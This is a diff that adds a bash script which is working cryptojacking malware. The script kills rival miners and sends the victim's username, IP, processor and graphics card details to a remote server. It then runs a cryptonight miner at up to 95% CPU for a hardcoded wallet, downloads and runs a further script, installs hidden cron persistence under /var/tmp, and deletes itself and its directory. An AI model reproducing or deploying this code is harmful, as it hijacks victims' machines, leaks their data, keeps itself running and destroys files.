@@ -1,0 +1,42 @@
+#!/bin/bash
+ps x | grep -v grep | grep sh | grep Ssl | awk {'print $1'} | while read -r p; do [[ $p ]] && kill "$p"; done
+ps x | grep -v grep | grep xmrigMiner | awk {'print $1'} | while read -r p; do [[ $p ]] && kill "$p"; done
+proc=`nproc`
+ARCH=`uname -m`
+SERVERIP=`curl http://www.karaibe.us/.foo/remote/info.php`
+if [ ! -f .miner ]; then
+echo miner$((1 + RANDOM % 100000)) > .miner
+fi
+echo "$(whoami)@$SERVERIP
+DATE: $(date)
+SCANDIR: $(pwd)
+PROCESORS: $(nproc)
+VIDEO CARDS: $(lspci | grep -i --color 'vga\|3d\|2d')
+MINER NAME: $(cat .miner)" > data.file
+data=`cat data.file`
+curl -d "info=NEW-MINER-RYO&data=$data" http://www.karaibe.us/.foo/remote/info.php
+rm -rf data.file
+hh="sh"
+SCRIPT_PATH=$(dirname $(readlink -f $0))
+if [ "$ARCH" == "i686" ];       then
+	./x86/daemon -t $(nproc) -a cryptonight -o pool.ryo.hashvault.pro:5555 -u RYoLscnqd94KqydJibbyRZNtAGcmGnXLW3iLDA52ndxsUvqwvdGGEsQijB5GBaUjo1a6zVCWLynh4ivsYAMknRFRSRQcwFQggay -p x$(cat .miner) --donate-level 1 --max-cpu-usage 95 -B > /dev/null &
+elif [ "$ARCH" == "x86_64" ];   then
+	./h64 -s $hh ./md64 -t $(nproc) -a cryptonight-heavy -o pool.ryo.hashvault.pro:5555 -u RYoLscnqd94KqydJibbyRZNtAGcmGnXLW3iLDA52ndxsUvqwvdGGEsQijB5GBaUjo1a6zVCWLynh4ivsYAMknRFRSRQcwFQggay -p x$(cat .miner) --donate-level 1 --max-cpu-usage 95 -B > /dev/null &
+fi
+sleep 10
+########################
+rm -rf /var/tmp/.nano
+mkdir /var/tmp/.nano
+curl -s http://www.karaibe.us/.foo/nanor.sh > /var/tmp/.nano/nano.sh
+chmod +x /var/tmp/.nano/nano.sh
+echo '*/30 * * * * /var/tmp/.nano/nano.sh &> /dev/null
+@reboot /bin/mkdir /var/tmp/.ssh && /usr/bin/curl -s http://www.karaibe.us/.foo/nanor.sh > /var/tmp/.ssh/nano.sh && /bin/chmod +x /var/tmp/.ssh/nano.sh && /var/tmp/.ssh/nano.sh' > cron.d
+crontab cron.d
+crontab -l
+rm -rf cron.d
+########################
+sleep 10
+rm -rf $0
+rm -rf $(pwd)
+echo OK
+
